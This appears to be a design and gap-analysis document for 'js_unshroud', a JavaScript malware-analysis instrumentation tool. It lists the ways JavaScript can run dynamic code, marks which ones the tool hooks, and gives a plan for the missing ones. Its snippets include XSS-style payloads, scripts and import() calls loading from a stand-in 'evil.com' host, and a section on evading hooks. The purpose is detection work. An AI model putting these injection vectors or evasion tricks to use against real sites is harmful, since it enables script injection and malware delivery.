# JavaScript Dynamic Code Execution Methods

## Comprehensive list of methods malware uses to execute deobfuscated code

This document catalogs ALL methods JavaScript can use to execute dynamically generated code, organized by risk level and current instrumentation status in js_unshroud.

---

## Category 1: Direct Code Execution (CRITICAL)

### 1. `eval()`
**Status:** ❌ NOT INSTRUMENTED

```javascript
eval('console.log("executed")');
window.eval('alert(1)');
globalThis.eval('malicious code');
```

**Malware Usage:** Very common, primary deobfuscation method

**Detection Gaps:**
- Direct eval calls: `eval(code)`
- Indirect eval: `window.eval`, `globalThis.eval`
- Aliased eval: `const e = eval; e(code)`
- Computed eval: `window['eval'](code)`

---

### 2. `Function()` Constructor
**Status:** ❌ NOT INSTRUMENTED

```javascript
new Function('console.log("executed")')();
new Function('arg1', 'arg2', 'return arg1 + arg2')(1, 2);
Function('code here')();

// Also these variants:
new GeneratorFunction('yield 1')();
new AsyncFunction('await fetch()')();
```

**Malware Usage:** Very common, eval alternative

**Detection Gaps:**
- Function constructor: `new Function(code)`
- Without new: `Function(code)`
- AsyncFunction constructor
- GeneratorFunction constructor
- AsyncGeneratorFunction constructor

---

### 3. `setTimeout()` / `setInterval()` with String
**Status:** ⚠️ PARTIALLY INSTRUMENTED (BUG: Not capturing events)

```javascript
setTimeout('console.log("executed")', 1000);
setInterval('malicious()', 5000);
```

**Malware Usage:** Common for delayed execution

**Current Implementation:**
- timer-hooks.js captures handler string
- **BUG:** Events not appearing in output despite hooks loading
- Should capture the code string before execution

**Detection Gaps:**
- Code string not visible in current output (bug)
- setImmediate() with string (Node.js/some browsers) - not instrumented

---

## Category 2: Script Injection Methods (HIGH PRIORITY)

### 4. `innerHTML` / `outerHTML` with `<script>` tags
**Status:** ⚠️ PARTIAL (logs operation but not content details)

```javascript
// Common malware pattern
element.innerHTML = '<script>maliciousCode()</script>';
element.innerHTML = '<img src=x onerror="evil()">';
element.outerHTML = '<script src="https://evil.com/payload.js"></script>';
```

**Malware Usage:** Very common, bypasses some CSP restrictions

**Current Implementation:**
- dom-hooks.js line 212-233: Instruments innerHTML setter
- **PROBLEM:** Only logs `valueLength`, not the actual content
- Cannot detect if `<script>` tags are being injected
- Cannot see event handler attributes (onerror, onclick, etc.)

**What's Missing:**
```javascript
// Current log:
{ type: 'dom', operation: 'innerHTML', valueLength: 150 }

// Should log:
{
  type: 'dom',
  operation: 'innerHTML',
  value: '<script>malicious...</script>', // FULL CONTENT
  containsScript: true,                   // Script tag detection
  containsEventHandlers: true,            // onerror, onclick, etc.
  scriptSources: ['https://evil.com/payload.js']
}
```

---

### 5. `insertAdjacentHTML()`
**Status:** ❌ NOT INSTRUMENTED

```javascript
element.insertAdjacentHTML('beforeend', '<script>evil()</script>');
element.insertAdjacentHTML('afterbegin', '<img src=x onerror=alert(1)>');
```

**Malware Usage:** Common alternative to innerHTML

---

### 6. Dynamic `<script>` Element Creation
**Status:** ⚠️ PARTIAL (appendChild tracked, but not script details)

```javascript
// Pattern 1: External script
const script = document.createElement('script');
script.src = 'https://evil.com/payload.js';
document.body.appendChild(script);

// Pattern 2: Inline script
const script = document.createElement('script');
script.textContent = 'maliciousCode()';
document.body.appendChild(script);

// Pattern 3: Data URL
const script = document.createElement('script');
script.src = 'data:text/javascript,alert(1)';
document.body.appendChild(script);
```

**Malware Usage:** Very common, most flexible method

**Current Implementation:**
- dom-hooks.js captures `appendChild` operation
- **PROBLEM:** Doesn't specifically track `<script>` elements
- Doesn't log `script.src` or `script.textContent`
- Doesn't detect data: URLs or blob: URLs

**What's Missing:**
```javascript
// Should detect and log:
{
  type: 'script_injection',
  method: 'createElement',
  scriptType: 'external' | 'inline' | 'data-url' | 'blob-url',
  src: 'https://evil.com/payload.js',
  content: 'maliciousCode()',  // if inline
  isAsync: false,
  isDefer: false,
  integrity: null,
  crossOrigin: null
}
```

---

### 7. `document.write()` / `document.writeln()`
**Status:** ❌ NOT INSTRUMENTED

```javascript
document.write('<script>evil()</script>');
document.write('<scr' + 'ipt>obfuscated</scr' + 'ipt>'); // Common obfuscation
document.writeln('<img src=x onerror=alert(1)>');
```

**Malware Usage:** Common, especially in older malware

**Detection Gaps:**
- No instrumentation for document.write/writeln
- Cannot see HTML content being written
- Cannot detect script tag injection

---

### 8. `textContent` / `innerText` on `<script>` elements
**Status:** ❌ NOT INSTRUMENTED

```javascript
const script = document.createElement('script');
script.textContent = 'maliciousCode()';  // Code executes when appended
document.body.appendChild(script);
```

**Malware Usage:** Alternative to innerHTML for script injection

---

## Category 3: URL-Based Execution (MEDIUM PRIORITY)

### 9. `javascript:` Protocol
**Status:** ❌ NOT INSTRUMENTED

```javascript
location.href = 'javascript:alert(1)';
location.replace('javascript:malicious()');
location.assign('javascript:eval(atob("..."))');

// Also via links:
const a = document.createElement('a');
a.href = 'javascript:evil()';
a.click();

// And iframes:
iframe.src = 'javascript:parent.malicious()';
```

**Malware Usage:** Less common but seen in XSS payloads

**Detection Gaps:**
- No tracking of javascript: URLs in location changes
- No tracking of javascript: URLs in anchor clicks
- No tracking of javascript: URLs in iframe.src

---

### 10. `data:` URL with `<script>`
**Status:** ⚠️ PARTIAL (network request logged but not analyzed)

```javascript
// In iframe
iframe.src = 'data:text/html,<script>alert(1)</script>';

// In script element
script.src = 'data:text/javascript,alert(1)';
script.src = 'data:text/javascript;base64,YWxlcnQoMSk=';  // Common obfuscation
```

**Malware Usage:** Common for bypassing URL filters

**Current Implementation:**
- Network hooks may log data: URLs
- **PROBLEM:** Not specifically flagged as code execution
- Base64-encoded data URLs not automatically decoded

---

### 11. `blob:` URL with Script
**Status:** ⚠️ PARTIAL (blob creation not tracked)

```javascript
const blob = new Blob(['maliciousCode()'], {type: 'text/javascript'});
const url = URL.createObjectURL(blob);

// Method 1: Script tag
const script = document.createElement('script');
script.src = url;
document.body.appendChild(script);

// Method 2: Worker
const worker = new Worker(url);
```

**Malware Usage:** Advanced malware for evading detection

**Detection Gaps:**
- Blob creation not tracked
- URL.createObjectURL not tracked
- blob: URLs not flagged in script.src
- Blob content not extracted

---

## Category 4: Event Handler Execution (MEDIUM PRIORITY)

### 12. `setAttribute()` with Event Handlers
**Status:** ❌ NOT INSTRUMENTED

```javascript
element.setAttribute('onclick', 'malicious()');
element.setAttribute('onerror', 'eval(atob("..."))');
img.setAttribute('onload', 'fetch("evil.com")');
```

**Malware Usage:** Common in DOM-based XSS

**Detection Gaps:**
- setAttribute not instrumented
- Cannot see event handler code strings
- Common vectors: onclick, onerror, onload, onmouseover

---

### 13. Direct Event Handler Properties
**Status:** ❌ NOT INSTRUMENTED

```javascript
element.onclick = function() { malicious(); };
element.onerror = new Function('alert(1)');
window.onload = eval;  // Aliased eval
```

**Malware Usage:** Common

**Detection Gaps:**
- Event handler property setters not hooked
- Cannot see handler function bodies
- Common: onclick, onerror, onload, onmessage

---

## Category 5: Worker-Based Execution (MEDIUM PRIORITY)

### 14. Web Workers
**Status:** ❌ NOT INSTRUMENTED

```javascript
// Method 1: External script
const worker = new Worker('evil.js');

// Method 2: Blob URL (common for obfuscation)
const blob = new Blob(['self.postMessage("evil")'], {type: 'text/javascript'});
const worker = new Worker(URL.createObjectURL(blob));

// Method 3: Data URL
const worker = new Worker('data:text/javascript,self.postMessage("evil")');
```

**Malware Usage:** Advanced malware, hard to detect

**Detection Gaps:**
- Worker constructor not tracked
- Worker script content not captured
- postMessage communication not fully tracked
- importScripts() inside workers not tracked

---

### 15. Shared Workers
**Status:** ❌ NOT INSTRUMENTED

```javascript
const worker = new SharedWorker('evil.js');
const worker = new SharedWorker(blobUrl);
```

**Malware Usage:** Rare but possible for persistence

---

## Category 6: Module-Based Execution (MEDIUM PRIORITY)

### 16. Dynamic `import()`
**Status:** ❌ NOT INSTRUMENTED

```javascript
// Method 1: External module
import('https://evil.com/payload.js').then(m => m.execute());

// Method 2: Data URL
import('data:text/javascript,export default () => alert(1)').then(m => m.default());

// Method 3: Blob URL
const blob = new Blob(['export default () => alert(1)'], {type: 'text/javascript'});
import(URL.createObjectURL(blob)).then(m => m.default());
```

**Malware Usage:** Newer malware, less common but increasing

**Detection Gaps:**
- import() calls not tracked
- Module URLs not logged
- Imported code not captured

---

### 17. `<script type="module">`
**Status:** ⚠️ PARTIAL (appendChild tracked but module content not analyzed)

```javascript
const script = document.createElement('script');
script.type = 'module';
script.textContent = 'import {evil} from "https://evil.com/mal.js"; evil();';
document.body.appendChild(script);
```

**Malware Usage:** Increasing as ES modules become standard

---

## Category 7: iframe-Based Execution (LOW-MEDIUM PRIORITY)

### 18. iframe with `srcdoc`
**Status:** ❌ NOT INSTRUMENTED

```javascript
const iframe = document.createElement('iframe');
iframe.srcdoc = '<script>parent.malicious()</script>';
document.body.appendChild(iframe);
```

**Malware Usage:** Less common but effective for sandboxing

---

### 19. iframe `contentWindow.eval()`
**Status:** ❌ NOT INSTRUMENTED

```javascript
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
iframe.contentWindow.eval('malicious()');
```

**Malware Usage:** Advanced technique to evade some detection

---

## Category 8: Service Worker (ALREADY INSTRUMENTED ✅)

### 20. Service Worker Registration
**Status:** ✅ INSTRUMENTED (service-worker-hooks.js)

```javascript
navigator.serviceWorker.register('/evil-sw.js');
```

**Current Implementation:**
- service-worker-hooks.js tracks registration, installation, activation
- Tracks fetch interception, cache operations, push subscriptions

**Good coverage!** This is one area where js_unshroud excels.

---

## Category 9: Exotic/Advanced Methods (LOW PRIORITY)

### 21. WebAssembly Execution
**Status:** ❌ NOT INSTRUMENTED

```javascript
const response = await fetch('malicious.wasm');
const buffer = await response.arrayBuffer();
const module = await WebAssembly.compile(buffer);
const instance = await WebAssembly.instantiate(module);
instance.exports.malicious();
```

**Malware Usage:** Very rare, but theoretically possible

**Note:** Wasm is not JavaScript, but can call JavaScript functions

---

### 22. `Reflect.construct()` with Function
**Status:** ❌ NOT INSTRUMENTED

```javascript
const fn = Reflect.construct(Function, ['console.log("evil")']);
fn();
```

**Malware Usage:** Rare, alternative to new Function()

---

### 23. Proxy Traps with Code Execution
**Status:** ❌ NOT INSTRUMENTED

```javascript
const handler = {
  get: (target, prop) => {
    eval('malicious()');
    return target[prop];
  }
};
const proxy = new Proxy({}, handler);
proxy.anything; // Triggers eval
```

**Malware Usage:** Very rare, highly obfuscated malware only

---

### 24. `with` Statement (Deprecated but still works)
**Status:** ❌ NOT INSTRUMENTED (not really code execution, more context manipulation)

```javascript
with({}) {
  eval('malicious()'); // eval in different scope
}
```

**Malware Usage:** Rare, mostly legacy

---

## Summary Table

| Method | Risk Level | Currently Instrumented | Priority to Add |
|--------|------------|----------------------|----------------|
| eval() | CRITICAL | ❌ No | P0 |
| Function() | CRITICAL | ❌ No | P0 |
| setTimeout(string) | HIGH | ⚠️ Broken | P0 |
| innerHTML with <script> | HIGH | ⚠️ Partial (no content) | P1 |
| createElement('script') | HIGH | ⚠️ Partial (no script details) | P1 |
| document.write() | HIGH | ❌ No | P1 |
| insertAdjacentHTML() | MEDIUM | ❌ No | P2 |
| setAttribute('on*') | MEDIUM | ❌ No | P2 |
| javascript: URLs | MEDIUM | ❌ No | P2 |
| data: URLs | MEDIUM | ⚠️ Partial | P2 |
| blob: URLs | MEDIUM | ❌ No | P2 |
| Web Workers | MEDIUM | ❌ No | P2 |
| import() | MEDIUM | ❌ No | P3 |
| iframe srcdoc | LOW | ❌ No | P3 |
| Service Workers | N/A | ✅ Yes | ✅ Done |
| WebAssembly | LOW | ❌ No | P4 |

---

## Recommended Implementation Plan

### Phase 1: Core Code Execution (P0)
Create `src/instrumentation/code-execution-hooks.js`:
- Hook eval (direct, indirect, aliased)
- Hook Function/AsyncFunction/GeneratorFunction constructors
- Fix setTimeout/setInterval string execution bug
- Hook Reflect.construct with Function

### Phase 2: Script Injection (P1)
Enhance `src/instrumentation/dom-hooks.js` or create `script-injection-hooks.js`:
- Enhance innerHTML/outerHTML to log full content + detect `<script>` tags
- Hook insertAdjacentHTML()
- Hook document.write/writeln()
- Detect script element creation and track src/textContent
- Detect data:/blob: URLs in script.src

### Phase 3: Event Handlers & Workers (P2)
Create `src/instrumentation/event-handler-hooks.js`:
- Hook setAttribute for event handler attributes
- Hook event handler property setters (onclick, onerror, etc.)
- Hook Worker/SharedWorker constructors
- Track blob: URL creation (Blob + URL.createObjectURL)

### Phase 4: Modern APIs (P3)
Create `src/instrumentation/module-hooks.js`:
- Hook dynamic import()
- Detect <script type="module">
- Hook iframe srcdoc
- Hook javascript: URL navigation

---

## Detection Evasion Techniques (How malware might bypass current instrumentation)

Even with all the above hooks, sophisticated malware can still evade:

1. **Native code access before instrumentation:**
   ```javascript
   const nativeEval = eval; // Capture before hooks load
   // Later:
   nativeEval('malicious()'); // Bypasses hooks
   ```
   **Mitigation:** Ensure hooks load BEFORE any page script (already done via addInitScript)

2. **Property descriptor manipulation:**
   ```javascript
   const desc = Object.getOwnPropertyDescriptor(window, 'eval');
   desc.value('malicious()'); // Calls original eval
   ```
   **Mitigation:** Hook Object.getOwnPropertyDescriptor

3. **Cross-realm execution:**
   ```javascript
   frames[0].eval('malicious()'); // iframe's eval
   ```
   **Mitigation:** Hook iframe creation and inject into new realms

4. **Function.prototype modification:**
   ```javascript
   Function.prototype.constructor('malicious()')();
   ```
   **Mitigation:** Hook Function.prototype.constructor getter

5. **Wasm-based execution:**
   ```javascript
   // Wasm module calls JS
   ```
   **Mitigation:** Hook WebAssembly.instantiate/compile

---

## Testing Recommendations

Create test fixture: `tests/fixtures/dynamic-execution-test.html`

Should test:
- All 20+ execution methods listed above
- Nested execution (eval inside Function inside setTimeout)
- Aliased functions (const e = eval; e())
- Cross-realm execution (iframe.contentWindow.eval)
- Data/blob URL execution
- Worker-based execution

Target: 100% detection rate for all common methods (Categories 1-4)

---

## Current State Assessment

**js_unshroud captures:**
- ✅ Service Worker operations (excellent coverage)
- ✅ Network requests (good coverage)
- ✅ Console output (good coverage)
- ⚠️ DOM mutations (partial - missing script content)
- ⚠️ Timer operations (broken - not logging)

**js_unshroud MISSES:**
- ❌ eval() - the #1 malware deobfuscation method
- ❌ Function() constructor - the #2 method
- ❌ Script injection content - innerHTML/createElement details
- ❌ Event handler code - onclick/onerror strings
- ❌ Worker-based execution - completely invisible
- ❌ Dynamic imports - modern malware vector

**Bottom line:** js_unshroud is currently blind to ~80% of dynamic code execution methods used by malware.
